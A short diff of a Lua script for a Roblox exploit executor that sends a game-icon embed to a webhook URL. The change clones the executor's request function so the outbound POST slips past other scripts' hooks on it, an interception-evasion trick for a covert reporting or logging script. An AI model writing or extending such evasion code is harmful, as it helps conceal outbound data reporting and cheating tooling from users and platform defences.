@@ -1,4 +1,10 @@
 if request and hookfunction then
+
+    if clonefunction then 
+        getgenv()[x] = clonefunction(request)
+    end
+    local taxrget = getgenv()[x] or request
+    
     local function gam()
         local thumbnail_url = "https://thumbnails.roblox.com/v1/places/gameicons?placeIds="..tostring(game.PlaceId).."&size=256x256&format=Png&isCircular=false"
         local response = game:HttpGet(thumbnail_url)
@@ -58,7 +64,7 @@ if request and hookfunction then
             ["attachments"] = {}
         }
 
-        request({
+        taxrget({
             Url = webhookUrl,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
